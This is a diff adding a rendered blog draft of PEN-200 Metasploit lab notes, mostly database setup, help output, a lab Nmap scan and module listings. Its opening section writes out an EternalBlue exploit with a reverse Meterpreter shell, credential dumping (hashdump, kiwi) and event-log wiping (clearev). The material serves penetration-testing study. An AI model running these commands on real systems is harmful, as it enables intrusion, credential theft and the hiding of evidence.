@@ -1,0 +1,2750 @@
+
+    <article class="git-file-panel" data-git-panel-section="blob" data-git-fragment-path="git/cm-blog-content-staging/blob/content/offsec/metasploit.md/index.html" data-git-raw-path="git/cm-blog-content-staging/blob/content/offsec/metasploit.md/raw.txt" data-git-line-count="3067">
+      <header class="git-file-header">
+        <div class="git-file-header-main">
+          <h4 class="git-file-title">metasploit.md</h4>
+          <div class="git-file-meta">161 KB · 3067 lines · content/offsec/metasploit.md</div>
+        </div>
+        <div class="git-file-actions">
+          <a class="git-file-action git-file-action--raw" href="./git/cm-blog-content-staging/blob/content/offsec/metasploit.md/raw.txt" target="_blank" rel="noopener">Raw</a>
+          <button type="button" class="git-file-action git-file-action--copy" data-git-file-copy>Copy</button>
+        </div>
+      </header>
+      <div class="git-file-body" data-git-file-body>
+        <hr>
+<h2>title: PEN-200 Module 20 — Metasploit With Restraint
+created: 2023-11-18 21:46:58Z
+updated: 2023-11-27 19:02:55Z</h2>
+<h1>PEN-200 Module 20 — Metasploit With Restraint</h1>
+<h2>TLDR;</h2>
+<p>Metasploit is invaluable when you treat it like any other engineering tool: scripted, logged, and explained. This pass adds the concrete procedures captured in the labs.</p>
+<h3>Reconnaissance Modules</h3>
+<pre><code>use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.119.0/24
+run
+
+use auxiliary/scanner/http/title
+set THREADS 20
+run
+</code></pre>
+<ul>
+<li>Export run results (<code>services -S smb -u</code>).</li>
+<li>Store workspace states: <code>workspace -a acme-internal</code> then <code>db_export -f xml acme-internal.xml</code> for backup.</li>
+</ul>
+<h3>Exploitation Workflow</h3>
+<ol>
+<li>Load module → <code>show options</code> → set <code>RHOSTS</code>, <code>RPORT</code>, <code>PAYLOAD</code>, <code>LHOST</code>, <code>LPORT</code>.</li>
+<li>Use <code>check</code> when available to confirm vulnerability.</li>
+<li>Enable logging: <code>spool logs/acme-msf.log</code> before <code>run</code>.</li>
+</ol>
+<pre><code>use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.119.21
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 192.168.49.1
+set EXITFUNC thread
+run -j
+</code></pre>
+<ul>
+<li>Record session IDs, pivot hosts, and post modules executed.</li>
+</ul>
+<h3>Post-Exploitation Discipline</h3>
+<pre><code>sessions -i 1
+sysinfo
+getuid
+hashdump
+load kiwi
+
+run post/windows/gather/enum_logged_on_users
+run post/multi/gather/enum_domain_group_users GROUP=&quot;Domain Admins&quot;
+</code></pre>
+<ul>
+<li>Dump loot into organised directories (<code>loot</code>, <code>download</code>).</li>
+<li>Clean up (<code>clearev</code>, <code>migrate</code>, <code>sessions -k &lt;id&gt;</code>) once tasks complete.</li>
+</ul>
+<h3>Automation</h3>
+<ul>
+<li>Resource scripts (<code>msfconsole -r scripts/acme_exploit.rc</code>) to reproduce module setups. Include comments and <code>sleep</code> commands when waiting for services.</li>
+<li>Metasploit RPC for integration:</li>
+</ul>
+<pre><code>msfrpcd -P supersecret -S
+python3 metasploit_helper.py --module exploit/windows/http/struts2_content_type_ognl --rhosts 192.168.119.45
+</code></pre>
+<ul>
+<li>Always store resource files and automation scripts in version control with timestamps.</li>
+</ul>
+<h3>Operational Hygiene</h3>
+<ul>
+<li>Disable <code>autopwn</code>, default payloads, and <code>Meterpreter</code> features not explicitly required by rules of engagement.</li>
+<li>Log every module you run, including unsuccessful ones, for transparency.</li>
+</ul>
+<h3>Defensive Recommendations</h3>
+<ul>
+<li>Provide patch KB references, disabling SMBv1, enabling RDP network-level authentication, etc.</li>
+<li>Supply detection ideas: unusual <code>svchost</code> behaviour, creation of service <code>%TEMP%\random.exe</code>, outbound HTTPS to C2 IP.</li>
+</ul>
+<p>Metasploit should never be a black box. Script it, log it, and justify every module so the client gains confidence alongside the shell access you deliver.</p>
+<h2>Working Notes... In Graphic Detail...</h2>
+<h3>The Metasploit Framework</h3>
+<ul>
+<li>Getting Familiar with Metasploit.</li>
+<li>Using Metasploit Payloads.</li>
+<li>Performing Post-Exploitation with Metasploit.</li>
+<li>Automating Metasploit.</li>
+</ul>
+<h4>20.1 Getting Familiar with Metasploit</h4>
+<ul>
+<li>Setup and navigate Metasploit.</li>
+<li>Use auxiliary modules.</li>
+<li>Leverage exploit modules.</li>
+</ul>
+<h5>Setup and Work with MSF</h5>
+<p>MSF comes preinstalled on Kali but doesn&#39;t start its DB service in the default configuration.  Use of the DB is not mandatory, but there are compelling reasons to like storing info about target hosts and tracking successful exploitation attempts.  MSF uses PostgresSQL as a DB service, which is not active or enable on boot in Kali.</p>
+<p>We can start, create, and initialize the MSF DB with <code>msfdb init</code>.</p>
+<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
+└─$ sudo msfdb init                                          
+[sudo] password for operator: 
+[+] Starting database
+[+] Creating database user &#39;msf&#39;
+[+] Creating databases &#39;msf&#39;
+[+] Creating databases &#39;msf_test&#39;
+[+] Creating configuration file &#39;/usr/share/metasploit-framework/config/database.yml&#39;
+[+] Creating initial database schema
+</code></pre>
+<p>To enable the DB service at boot time we use <code>systemctl</code>.</p>
+<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
+└─$ sudo systemctl enable postgresql   
+Synchronizing state of postgresql.service with SysV service script with /lib/systemd/systemd-sysv-install.
+Executing: /lib/systemd/systemd-sysv-install enable postgresql
+Created symlink /etc/systemd/system/multi-user.target.wants/postgresql.service → /lib/systemd/system/postgresql.service.
+</code></pre>
+<p>Launch the Metasploit CLI with <code>msfconsole</code>.</p>
+<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
+└─$ sudo msfconsole                 
+                                                  
+### cowsay++
+ ____________
+&lt; metasploit &gt;
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+
+       =[ metasploit v6.3.31-dev                          ]
++ -- --=[ 2346 exploits - 1220 auxiliary - 413 post       ]
++ -- --=[ 1388 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Search can apply complex filters such as 
+search cve:2009 type:exploit, see all the filters 
+with help search
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 &gt;
+</code></pre>
+<ul>
+<li>Hide the banner and version info on start up with <code>-q</code></li>
+</ul>
+<p>Once the CLI has started we can verify the DB connectivity with <code>db_status</code>.</p>
+<pre><code>msf6 &gt; db_status
+[*] Connected to msf. Connection type: postgresql.
+</code></pre>
+<ul>
+<li>The DB is connected and we are all setup.</li>
+</ul>
+<p>The CLI of MSF provides numerous commands to navigate the framework, divided into <a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/">categories</a>.  The categories consist of Core Commands, Module Commands, Job Commands, Resource Script Commands, Database Backend Commands, Credentials Backend Commands, and Developer Commands.</p>
+<p>We can list all available commands by entering <code>help</code>.</p>
+<pre><code>msf6 &gt; help
+
+Core Commands
+=============
+
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    banner        Display an awesome metasploit banner
+    cd            Change the current working directory
+    color         Toggle color
+    connect       Communicate with a host
+    debug         Display information useful for debugging
+    exit          Exit the console
+    features      Display the list of not yet released features that can be opted in to
+    get           Gets the value of a context-specific variable
+    getg          Gets the value of a global variable
+    grep          Grep the output of another command
+    help          Help menu
+    history       Show command history
+    load          Load a framework plugin
+    quit          Exit the console
+    repeat        Repeat a list of commands
+    route         Route traffic through a session
+    save          Saves the active datastores
+    sessions      Dump session listings and display information about sessions
+    set           Sets a context-specific variable to a value
+    setg          Sets a global variable to a value
+    sleep         Do nothing for the specified number of seconds
+    spool         Write console output into a file as well the screen
+    threads       View and manipulate background threads
+    tips          Show a list of useful productivity tips
+    unload        Unload a framework plugin
+    unset         Unsets one or more context-specific variables
+    unsetg        Unsets one or more global variables
+    version       Show the framework and console library version numbers
+
+
+Module Commands
+===============
+
+    Command       Description
+    -------       -----------
+    advanced      Displays advanced options for one or more modules
+    back          Move back from the current context
+    clearm        Clear the module stack
+    favorite      Add module(s) to the list of favorite modules
+    favorites     Print the list of favorite modules (alias for `show favorites`)
+    info          Displays information about one or more modules
+    listm         List the module stack
+    loadpath      Searches for and loads modules from a path
+    options       Displays global options or for one or more modules
+    popm          Pops the latest module off the stack and makes it active
+    previous      Sets the previously loaded module as the current module
+    pushm         Pushes the active or list of modules onto the module stack
+    reload_all    Reloads all modules from all defined module paths
+    search        Searches module names and descriptions
+    show          Displays modules of a given type, or all modules
+    use           Interact with a module by name or search term/index
+
+
+Job Commands
+============
+
+    Command       Description
+    -------       -----------
+    handler       Start a payload handler as job
+    jobs          Displays and manages jobs
+    kill          Kill a job
+    rename_job    Rename a job
+
+
+Resource Script Commands
+========================
+
+    Command       Description
+    -------       -----------
+    makerc        Save commands entered since start to a file
+    resource      Run the commands stored in a file
+
+
+Database Backend Commands
+=========================
+
+    Command       Description
+    -------       -----------
+    analyze       Analyze database information about a specific address or address rang
+                  e
+    db_connect    Connect to an existing data service
+    db_disconnec  Disconnect from the current data service
+    t
+    db_export     Export a file containing the contents of the database
+    db_import     Import a scan result file (filetype will be auto-detected)
+    db_nmap       Executes nmap and records the output automatically
+    db_rebuild_c  Rebuilds the database-stored module cache (deprecated)
+    ache
+    db_remove     Remove the saved data service entry
+    db_save       Save the current data service connection as the default to reconnect
+                  on startup
+    db_status     Show the current data service status
+    hosts         List all hosts in the database
+    klist         List Kerberos tickets in the database
+    loot          List all loot in the database
+    notes         List all notes in the database
+    services      List all services in the database
+    vulns         List all vulnerabilities in the database
+    workspace     Switch between database workspaces
+
+
+Credentials Backend Commands
+============================
+
+    Command       Description
+    -------       -----------
+    creds         List all credentials in the database
+
+
+Developer Commands
+==================
+
+    Command       Description
+    -------       -----------
+    edit          Edit the current module or a file with the preferred editor
+    irb           Open an interactive Ruby shell in the current context
+    log           Display framework.log paged to the end if possible
+    pry           Open the Pry debugger on the current module or Framework
+    reload_lib    Reload Ruby library files from specified paths
+    time          Time how long it takes to run a particular command
+
+
+msfconsole
+==========
+
+`msfconsole` is the primary interface to Metasploit Framework. There is quite a
+lot that needs go here, please be patient and keep an eye on this space!
+
+Building ranges and lists
+-------------------------
+
+Many commands and options that take a list of things can use ranges to avoid
+having to manually list each desired thing. All ranges are inclusive.
+
+##### Ranges of IDs
+
+Commands that take a list of IDs can use ranges to help. Individual IDs must be
+separated by a `,` (no space allowed) and ranges can be expressed with either
+`-` or `..`.
+
+##### Ranges of IPs
+
+There are several ways to specify ranges of IP addresses that can be mixed
+together. The first way is a list of IPs separated by just a ` ` (ASCII space),
+with an optional `,`. The next way is two complete IP addresses in the form of
+`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
+specifications may also be used, however the whole address must be given to
+Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
+Additionally, a netmask can be used in conjunction with a domain name to
+dynamically resolve which block to target. All these methods work for both IPv4
+and IPv6 addresses. IPv4 addresses can also be specified with special octet
+ranges from the [NMAP target
+specification](https://nmap.org/book/man-target-specification.html)
+
+##### Examples
+
+Terminate the first sessions:
+
+    sessions -k 1
+
+Stop some extra running jobs:
+
+    jobs -k 2-6,7,8,11..15
+
+Check a set of IP addresses:
+
+    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255
+
+Target a set of IPv6 hosts:
+
+    set RHOSTS fe80::3990:0000/110, ::1-::f0f0
+
+Target a block from a resolved domain name:
+
+    set RHOSTS www.example.test/24
+</code></pre>
+<p>Before jumping into operations in MSF, let&#39;s discuss workspaces.  Assume we have performed a pentest and Metasploit stored all info about our target and infrastructure in the database.  When we start the next pentest that info will still be in the DB, to avoid mixing assessment results we can use workspaces.</p>
+<p>The MSF <code>workspace</code> command lists all previously created workspaces, we can switch them by adding the name to the command.  To create a new workspace provide the name as an argument to <code>-a</code>.</p>
+<p>Create a workspace name <code>pen200</code> for us to store the results of this section.</p>
+<pre><code>msf6 &gt; workspace
+* default
+msf6 &gt; workspace -a pen200
+[*] Added workspace: pen200
+[*] Workspace: pen200
+msf6 &gt; workspace
+  default
+* pen200
+</code></pre>
+<p>Once created, Metasploit will use it as a current workspace.</p>
+<p>Let&#39;s populate the DB and familiarize ourselves with some of the Databse Backend Commands.  We can scan BRUTE2 with <code>db_nmap</code> which is a wrapper to execute Nmap inside Metasploit and save the finding to the DB.  The command syntax is identical to Nmap.</p>
+<pre><code>msf6 &gt; db_nmap
+[*] Usage: db_nmap [--save | [--help | -h]] [nmap options]
+msf6 &gt; db_nmap -A 192.168.197.202
+[*] Nmap: Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-19 14:40 PST
+[*] Nmap: Nmap scan report for 192.168.197.202
+[*] Nmap: Host is up (0.076s latency).
+[*] Nmap: Not shown: 994 closed tcp ports (reset)
+[*] Nmap: PORT     STATE SERVICE       VERSION
+[*] Nmap: 21/tcp   open  ftp?
+[*] Nmap: | ftp-syst:
+[*] Nmap: |_  SYST: UNIX emulated by FileZilla.
+[*] Nmap: |_ssl-date: TLS randomness does not represent time
+[*] Nmap: | fingerprint-strings:
+[*] Nmap: |   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
+[*] Nmap: |     220-FileZilla Server 1.4.1
+[*] Nmap: |     Please visit https://filezilla-project.org/
+[*] Nmap: |   GetRequest:
+[*] Nmap: |     220-FileZilla Server 1.4.1
+[*] Nmap: |     Please visit https://filezilla-project.org/
+[*] Nmap: |     What are you trying to do? Go away.
+[*] Nmap: |   HTTPOptions, RTSPRequest:
+[*] Nmap: |     220-FileZilla Server 1.4.1
+[*] Nmap: |     Please visit https://filezilla-project.org/
+[*] Nmap: |     Wrong command.
+[*] Nmap: |   Help:
+[*] Nmap: |     220-FileZilla Server 1.4.1
+[*] Nmap: |     Please visit https://filezilla-project.org/
+[*] Nmap: |     214-The following commands are recognized.
+[*] Nmap: |     USER TYPE SYST SIZE RNTO RNFR RMD REST QUIT
+[*] Nmap: |     HELP XMKD MLST MKD EPSV XCWD NOOP AUTH OPTS DELE
+[*] Nmap: |     CDUP APPE STOR ALLO RETR PWD FEAT CLNT MFMT
+[*] Nmap: |     MODE XRMD PROT ADAT ABOR XPWD MDTM LIST MLSD PBSZ
+[*] Nmap: |     NLST EPRT PASS STRU PASV STAT PORT
+[*] Nmap: |_    Help ok.
+[*] Nmap: | ssl-cert: Subject: commonName=filezilla-server self signed certificate
+[*] Nmap: | Not valid before: 2022-06-20T21:11:52
+[*] Nmap: |_Not valid after:  2023-06-21T21:16:52
+[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
+[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+[*] Nmap: 445/tcp  open  microsoft-ds?
+[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
+[*] Nmap: | rdp-ntlm-info:
+[*] Nmap: |   Target_Name: BRUTE2
+[*] Nmap: |   NetBIOS_Domain_Name: BRUTE2
+[*] Nmap: |   NetBIOS_Computer_Name: BRUTE2
+[*] Nmap: |   DNS_Domain_Name: BRUTE2
+[*] Nmap: |   DNS_Computer_Name: BRUTE2
+[*] Nmap: |   Product_Version: 10.0.20348
+[*] Nmap: |_  System_Time: 2023-11-19T22:41:10+00:00
+[*] Nmap: | ssl-cert: Subject: commonName=BRUTE2
+[*] Nmap: | Not valid before: 2023-11-10T06:26:57
+[*] Nmap: |_Not valid after:  2024-05-11T06:26:57
+[*] Nmap: |_ssl-date: 2023-11-19T22:41:19+00:00; 0s from scanner time.
+[*] Nmap: 8000/tcp open  http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+[*] Nmap: |_http-title: Beta App Template
+[*] Nmap: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+[*] Nmap: SF-Port21-TCP:V=7.94%I=7%D=11/19%Time=655A8EDA%P=x86_64-pc-linux-gnu%r(NUL
+[*] Nmap: SF:L,4D,&quot;220-FileZilla\x20Server\x201\.4\.1\r\n220\x20Please\x20visit\x20h
+[*] Nmap: SF:ttps://filezilla-project\.org/\r\n&quot;)%r(GenericLines,4D,&quot;220-FileZilla\x
+[*] Nmap: SF:20Server\x201\.4\.1\r\n220\x20Please\x20visit\x20https://filezilla-proj
+[*] Nmap: SF:ect\.org/\r\n&quot;)%r(Help,17C,&quot;220-FileZilla\x20Server\x201\.4\.1\r\n220\x
+[*] Nmap: SF:20Please\x20visit\x20https://filezilla-project\.org/\r\n214-The\x20foll
+[*] Nmap: SF:owing\x20commands\x20are\x20recognized\.\r\n\x20NOP\x20\x20USER\x20TYPE
+[*] Nmap: SF:\x20SYST\x20SIZE\x20RNTO\x20RNFR\x20RMD\x20\x20REST\x20QUIT\r\n\x20HELP
+[*] Nmap: SF:\x20XMKD\x20MLST\x20MKD\x20\x20EPSV\x20XCWD\x20NOOP\x20AUTH\x20OPTS\x20
+[*] Nmap: SF:DELE\r\n\x20CWD\x20\x20CDUP\x20APPE\x20STOR\x20ALLO\x20RETR\x20PWD\x20\
+[*] Nmap: SF:x20FEAT\x20CLNT\x20MFMT\r\n\x20MODE\x20XRMD\x20PROT\x20ADAT\x20ABOR\x20
+[*] Nmap: SF:XPWD\x20MDTM\x20LIST\x20MLSD\x20PBSZ\r\n\x20NLST\x20EPRT\x20PASS\x20STR
+[*] Nmap: SF:U\x20PASV\x20STAT\x20PORT\r\n214\x20Help\x20ok\.\r\n&quot;)%r(GetRequest,76,
+[*] Nmap: SF:&quot;220-FileZilla\x20Server\x201\.4\.1\r\n220\x20Please\x20visit\x20https:
+[*] Nmap: SF://filezilla-project\.org/\r\n501\x20What\x20are\x20you\x20trying\x20to\
+[*] Nmap: SF:x20do\?\x20Go\x20away\.\r\n&quot;)%r(HTTPOptions,61,&quot;220-FileZilla\x20Server
+[*] Nmap: SF:\x201\.4\.1\r\n220\x20Please\x20visit\x20https://filezilla-project\.org
+[*] Nmap: SF:/\r\n500\x20Wrong\x20command\.\r\n&quot;)%r(RTSPRequest,61,&quot;220-FileZilla\x2
+[*] Nmap: SF:0Server\x201\.4\.1\r\n220\x20Please\x20visit\x20https://filezilla-proje
+[*] Nmap: SF:ct\.org/\r\n500\x20Wrong\x20command\.\r\n&quot;)%r(RPCCheck,4D,&quot;220-FileZill
+[*] Nmap: SF:a\x20Server\x201\.4\.1\r\n220\x20Please\x20visit\x20https://filezilla-p
+[*] Nmap: SF:roject\.org/\r\n&quot;)%r(DNSVersionBindReqTCP,4D,&quot;220-FileZilla\x20Server\x
+[*] Nmap: SF:201\.4\.1\r\n220\x20Please\x20visit\x20https://filezilla-project\.org/\
+[*] Nmap: SF:r\n&quot;)%r(DNSStatusRequestTCP,4D,&quot;220-FileZilla\x20Server\x201\.4\.1\r\n2
+[*] Nmap: SF:20\x20Please\x20visit\x20https://filezilla-project\.org/\r\n&quot;)%r(SSLSes
+[*] Nmap: SF:sionReq,4D,&quot;220-FileZilla\x20Server\x201\.4\.1\r\n220\x20Please\x20visi
+[*] Nmap: SF:t\x20https://filezilla-project\.org/\r\n&quot;)%r(TerminalServerCookie,4D,&quot;2
+[*] Nmap: SF:20-FileZilla\x20Server\x201\.4\.1\r\n220\x20Please\x20visit\x20https://
+[*] Nmap: SF:filezilla-project\.org/\r\n&quot;)%r(TLSSessionReq,4D,&quot;220-FileZilla\x20Serv
+[*] Nmap: SF:er\x201\.4\.1\r\n220\x20Please\x20visit\x20https://filezilla-project\.o
+[*] Nmap: SF:rg/\r\n&quot;);
+[*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+[*] Nmap: TCP/IP fingerprint:
+[*] Nmap: OS:SCAN(V=7.94%E=4%D=11/19%OT=21%CT=1%CU=41424%PV=Y%DS=4%DC=T%G=Y%TM=655A8F
+[*] Nmap: OS:10%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10F%TI=I%TS=A)OPS(O1=M551N
+[*] Nmap: OS:W8ST11%O2=M551NW8ST11%O3=M551NW8NNT11%O4=M551NW8ST11%O5=M551NW8ST11%O6=M
+[*] Nmap: OS:551ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y
+[*] Nmap: OS:%T=80%W=FFFF%O=M551NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=
+[*] Nmap: OS:)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
+[*] Nmap: OS:=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A3F1%R
+[*] Nmap: OS:UD=G)IE(R=N)
+[*] Nmap: Network Distance: 4 hops
+[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+[*] Nmap: Host script results:
+[*] Nmap: | smb2-security-mode:
+[*] Nmap: |   3:1:1:
+[*] Nmap: |_    Message signing enabled but not required
+[*] Nmap: | smb2-time:
+[*] Nmap: |   date: 2023-11-19T22:41:15
+[*] Nmap: |_  start_date: N/A
+[*] Nmap: TRACEROUTE (using port 53/tcp)
+[*] Nmap: HOP RTT      ADDRESS
+[*] Nmap: 1   76.18 ms 192.168.45.1
+[*] Nmap: 2   76.15 ms 192.168.45.254
+[*] Nmap: 3   76.20 ms 192.168.251.1
+[*] Nmap: 4   76.25 ms 192.168.197.202
+[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 62.80 seconds
+</code></pre>
+<ul>
+<li>If the DB service is running, Metasploit will log findings and info about discovered hosts, services, or credentials in a convenient, accessible database.</li>
+</ul>
+<p>To list all discovered hosts we can enter <code>hosts</code>.</p>
+<pre><code>msf6 &gt; hosts
+
+Hosts
+=====
+
+address       mac  name  os_name       os_flavor  os_sp  purpose  info  comments
+-------       ---  ----  -------       ---------  -----  -------  ----  --------
+192.168.197.             Windows 2022                    server
+202
+</code></pre>
+<h1>Enter <code>services</code> to display the discovered services from our port scan, we can filter for specific port number by providing it as an argument to <code>-p</code>.
+```
+msf6 &gt; services
+Services</h1>
+<p>host          port  proto  name           state  info</p>
+<hr>
+<p>192.168.197.  21    tcp    ftp            open
+202
+192.168.197.  135   tcp    msrpc          open   Microsoft Windows RPC
+202
+192.168.197.  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
+202
+192.168.197.  445   tcp    microsoft-ds   open
+202
+192.168.197.  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
+202
+192.168.197.  8000  tcp    http           open   Golang net/http server Go-IPFS json-rp
+202                                              c or InfluxDB API</p>
+<h1>msf6 &gt; services -p 8000
+Services</h1>
+<p>host          port  proto  name  state  info</p>
+<hr>
+<p>192.168.197.  8000  tcp    http  open   Golang net/http server Go-IPFS json-rpc or Infl
+202                                     uxDB API</p>
+<pre><code>- See all discovered services up to this point.
+- Quickly identify all hosts with a specific service running.
+
+When working with numerous target systems during an assessment, the Database Backend Commands are invaluable in identifying important info and discovering potential attack vectors.  Results stored in the DB can also be used as input to modules, which we will discuss in the next section.
+
+Let&#39;s briefly review modules again, modules are used to perform tasks in Metasploit such as scanning or exploiting targets.  The framework includes several thousand modules divided into categories.
+
+The categories are displayed on the splash screen summary and can be viewed with the `show -h` command.
+</code></pre>
+<p>msf6 &gt; show -h
+[<em>] Valid parameters for the &quot;show&quot; command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
+[</em>] Additional module-specific parameters are: missing, advanced, evasion, targets, actions</p>
+<pre><code>- Shows the categories of the Metasploit modules.
+
+To activate a module we enter the `use` command with the module name.  The modules all follow a common slash-delimeted hierarchal syntax.
+- `module type/os`
+- `vendor`
+- `app`
+- `operation`
+- `protocol/module name`
+This makes it easy to explore and use modules.  We will explore auxiliary modules in the next section and then dive into exploit modules.
+
+##### Auxiliary Modules
+
+MSF includes hundreds of auxiliary modules, priving functionality such as proto enum, port scanning, fuzzing, sniffing, and more.  Aux mods are useful for many tasks including info gathering (under the gather/hierarchy), and so on.
+
+There are too many to cover, but we will demonstrate the syntax and operation of two very common auxiliary modules.  To list all aux mods, we can run the `show auxiliary` command.  This presents us with a long list of all aux mods.
+</code></pre>
+<p>msf6 &gt; show auxiliary</p>
+<h1>Auxiliary</h1>
+<h1>Name                                                                     Disclosure Date  Rank    Check  Description</h1>
+<hr>
+<p>   0     auxiliary/admin/2wire/xslt_password_reset                                2007-08-15       normal  No     2Wire Cross-Site Request Forgery Password Reset Vulnerability
+   1     auxiliary/admin/android/google_play_store_uxss_xframe_rce                                 normal  No     Android Browser RCE Through Google Play Store XFO
+   2     auxiliary/admin/appletv/appletv_display_image                                             normal  No     Apple TV Image Remote Control
+   3     auxiliary/admin/appletv/appletv_display_video                                             normal  No     Apple TV Video Remote Control
+   4     auxiliary/admin/atg/atg_client                                                            normal  No     Veeder-Root Automatic Tank Gauge (ATG) Administrative Client
+   5     auxiliary/admin/aws/aws_launch_instances                                                  normal  No     Launches Hosts in AWS
+   6     auxiliary/admin/backupexec/dump                                                           normal  No     Veritas Backup Exec Windows Remote File Access
+   7     auxiliary/admin/backupexec/registry                                                       normal  No     Veritas Backup Exec Server Registry Access
+   8     auxiliary/admin/chromecast/chromecast_reset                                               normal  No     Chromecast Factory Reset DoS
+   9     auxiliary/admin/chromecast/chromecast_youtube                                             normal  No     Chromecast YouTube Remote Control
+...</p>
+<pre><code>
+We can use `search` to reduce the output considerably, filtering by app, type, CVE ID, operation, platform, and more.  In this example, we want to obtain the SMB version of the previously scanned system BRUTE2 by using a Metasploit aux mod.
+
+To find the correct mod we can search all SMB aux mods with `search type:auxiliary smb`
+</code></pre>
+<p>msf6 &gt; search type:auxiliary smb</p>
+<h1>Matching Modules</h1>
+<h1>Name                                                            Disclosure Date  Rank    Check  Description</h1>
+<hr>
+<p>   0   auxiliary/server/capture/smb                                                     normal  No     Authentication Capture: SMB
+   1   auxiliary/scanner/http/citrix_dir_traversal                     2019-12-17       normal  No     Citrix ADC (NetScaler) Directory Traversal Scanner
+   2   auxiliary/scanner/smb/impacket/dcomexec                         2018-03-19       normal  No     DCOM Exec
+   3   auxiliary/scanner/smb/impacket/secretsdump                                       normal  No     DCOM Exec
+   4   auxiliary/scanner/dcerpc/dfscoerce                                               normal  No     DFSCoerce
+   5   auxiliary/server/http_ntlmrelay                                                  normal  No     HTTP Client MS Credential Relayer
+   6   auxiliary/gather/konica_minolta_pwd_extract                                      normal  No     Konica Minolta Password Extractor
+   7   auxiliary/fileformat/odt_badodt                                 2018-05-01       normal  No     LibreOffice 6.03 /Apache OpenOffice 4.1.5 Malicious ODT File Generator
+   8   auxiliary/admin/smb/ms17_010_command                            2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   9   auxiliary/scanner/smb/smb_ms17_010                                               normal  No     MS17-010 SMB RCE Detection
+   10  auxiliary/dos/windows/smb/ms05_047_pnp                                           normal  No     Microsoft Plug and Play Service Registry Overflow
+   11  auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal  No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
+   12  auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal  No     Microsoft SQL Server NTLM Stealer
+   13  auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal  No     Microsoft SQL Server SQLi NTLM Stealer
+   14  auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal  No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
+   15  auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal  No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
+   16  auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal  No     Microsoft SRV.SYS Mailslot Write Corruption
+   17  auxiliary/dos/windows/smb/ms06_063_trans                                         normal  No     Microsoft SRV.SYS Pipe Transaction No Null
+   18  auxiliary/dos/windows/smb/ms09_001_write                                         normal  No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
+   19  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+   20  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
+   21  auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal  No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
+   22  auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal  No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
+   23  auxiliary/scanner/smb/psexec_loggedin_users                                      normal  No     Microsoft Windows Authenticated Logged In Users Enumeration
+   24  auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal  No     Microsoft Windows Browser Pool DoS
+   25  auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal  No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
+   26  auxiliary/docx/word_unc_injector                                                 normal  No     Microsoft Word UNC Path Injector
+   27  auxiliary/spoof/nbns/nbns_response                                               normal  No     NetBIOS Name Service Spoofer
+   28  auxiliary/admin/oracle/ora_ntlm_stealer                         2009-04-07       normal  No     Oracle SMB Relay Code Execution
+   29  auxiliary/scanner/dcerpc/petitpotam                                              normal  No     PetitPotam
